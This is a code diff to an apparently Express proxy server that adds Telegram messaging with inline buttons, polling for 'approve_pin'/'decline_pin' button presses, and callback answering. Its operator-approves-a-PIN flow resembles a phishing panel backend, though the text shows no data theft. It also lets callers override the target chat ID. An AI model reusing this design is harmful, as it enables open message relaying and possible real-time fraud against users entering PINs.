@@ -616,12 +616,20 @@ app.get('/api/geo/ip', async (req, res) => {
   }
 });
 
-// Telegram API endpoint - отправка сообщений через сервер для безопасности
+// Telegram API endpoint - отправка сообщений через сервер для безопасности (с кнопками и без)
 app.post('/api/telegram/send', express.json(), async (req, res) => {
   try {
-    const { message, chatId } = req.body;
+    const { message, chatId, buttons } = req.body || {};
+    
+    console.log('Telegram send request received:', {
+      hasMessage: !!message,
+      messageLength: message?.length || 0,
+      hasButtons: Array.isArray(buttons) && buttons.length > 0,
+      chatIdOverride: chatId || 'none'
+    });
     
     if (!message) {
+      console.error('Telegram: Message is required but missing');
       return res.status(400).json({ error: 'Message is required' });
     }
 
@@ -629,30 +637,69 @@ app.post('/api/telegram/send', express.json(), async (req, res) => {
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = chatId || process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID;
 
+    console.log('Telegram config check:', {
+      hasToken: !!TELEGRAM_BOT_TOKEN,
+      tokenLength: TELEGRAM_BOT_TOKEN?.length || 0,
+      hasChatId: !!TELEGRAM_CHAT_ID,
+      chatId: TELEGRAM_CHAT_ID || 'none'
+    });
+
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.warn('Telegram: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables');
+      console.error('Telegram: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables', {
+        hasToken: !!TELEGRAM_BOT_TOKEN,
+        hasChatId: !!TELEGRAM_CHAT_ID,
+        envKeys: Object.keys(process.env).filter(k => k.includes('TELEGRAM'))
+      });
       return res.status(500).json({ error: 'Telegram bot not configured' });
     }
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    } as any;
+
+    // Если переданы кнопки — добавляем inline_keyboard
+    if (Array.isArray(buttons) && buttons.length > 0) {
+      payload.reply_markup = { inline_keyboard: [buttons] };
+    }
+
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
-      })
+      body: JSON.stringify(payload)
     });
 
-    if (!response.ok) {
-      const errorText = await response.text().catch(() => '');
-      console.error('Telegram API error:', response.status, errorText);
-      return res.status(500).json({ error: 'Failed to send Telegram message' });
+    const rawText = await response.text().catch(() => '');
+    let data = null;
+    try {
+      data = rawText ? JSON.parse(rawText) : null;
+    } catch (parseErr) {
+      console.error('Telegram API JSON parse error:', parseErr, 'raw:', rawText?.slice(0, 200));
     }
 
-    const data = await response.json();
+    // HTTP-уровень: ошибка
+    if (!response.ok) {
+      console.error('Telegram API HTTP error:', response.status, rawText?.slice(0, 200));
+      return res.status(500).json({ error: 'Failed to send Telegram message (HTTP)', status: response.status, body: data || rawText });
+    }
+
+    // Telegram-уровень: ok=false
+    if (!data || data.ok === false) {
+      console.error('Telegram API logical error:', data || rawText?.slice(0, 200));
+      return res.status(500).json({ error: 'Failed to send Telegram message (Telegram)', body: data || rawText });
+    }
+
+    console.log('Telegram message sent successfully:', {
+      chatId: TELEGRAM_CHAT_ID,
+      ok: data.ok,
+      resultChatId: data.result?.chat?.id,
+      resultUsername: data.result?.chat?.username
+    });
+
     res.json({ success: true, data });
   } catch (error) {
     console.error('Telegram send error:', error);
@@ -670,4 +717,93 @@ app.use((req, res) => {
 
 app.listen(PORT, () => {
   console.log(`Proxy server running on port ${PORT}`);
+});
+
+// --- Telegram callback polling state (server-side) ---
+let TELEGRAM_LAST_UPDATE_ID = 0;
+
+// Telegram polling endpoint for callback queries (approve/decline)
+app.post('/api/telegram/poll', async (req, res) => {
+  try {
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID;
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.warn('Telegram poll: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
+      return res.status(500).json({ ok: false, error: 'Telegram bot not configured' });
+    }
+
+    const offset = TELEGRAM_LAST_UPDATE_ID ? TELEGRAM_LAST_UPDATE_ID + 1 : 0;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?timeout=10&offset=${offset}`;
+    const response = await fetch(url, { method: 'GET' });
+    if (!response.ok) {
+      const txt = await response.text().catch(() => '');
+      console.warn('Telegram poll HTTP error:', response.status, txt.slice(0, 200));
+      return res.json({ ok: false });
+    }
+    const data = await response.json().catch(() => null);
+    if (!data || data.ok === false || !Array.isArray(data.result)) {
+      console.warn('Telegram poll invalid response:', data);
+      return res.json({ ok: false });
+    }
+
+    let found = null;
+    let maxId = TELEGRAM_LAST_UPDATE_ID;
+
+    for (const upd of data.result) {
+      const updId = typeof upd.update_id === 'number' ? upd.update_id : 0;
+      if (updId > maxId) maxId = updId;
+      const cq = upd.callback_query;
+      if (!cq) continue;
+      const fromId = String(cq.from?.id || '');
+      const msgChatId = String(cq.message?.chat?.id || '');
+      const targetId = String(TELEGRAM_CHAT_ID);
+      const isOurChat = fromId === targetId || msgChatId === targetId;
+      const dataStr = String(cq.data || '');
+      if (isOurChat && (dataStr === 'approve_pin' || dataStr === 'decline_pin')) {
+        found = {
+          kind: dataStr,
+          updateId: updId,
+          callbackQueryId: String(cq.id || '')
+        };
+        break;
+      }
+    }
+
+    if (maxId > TELEGRAM_LAST_UPDATE_ID) {
+      TELEGRAM_LAST_UPDATE_ID = maxId;
+    }
+
+    return res.json({ ok: true, result: found });
+  } catch (err) {
+    console.error('Telegram poll error:', err);
+    return res.json({ ok: false });
+  }
+});
+
+// Telegram answer callback endpoint
+app.post('/api/telegram/answer-callback', async (req, res) => {
+  try {
+    const { callbackQueryId, text } = req.body || {};
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN;
+    if (!TELEGRAM_BOT_TOKEN || !callbackQueryId) {
+      console.warn('Telegram answer: missing token or callbackQueryId');
+      return res.status(400).json({ ok: false, error: 'Missing token or callbackQueryId' });
+    }
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+    const body = { callback_query_id: String(callbackQueryId), text: text || '' };
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    if (!response.ok) {
+      const txt = await response.text().catch(() => '');
+      console.error('Telegram answer HTTP error:', response.status, txt.slice(0, 200));
+      return res.status(500).json({ ok: false, error: 'Failed to answer callback' });
+    }
+    return res.json({ ok: true });
+  } catch (err) {
+    console.error('Telegram answer error:', err);
+    return res.status(500).json({ ok: false });
+  }
 });
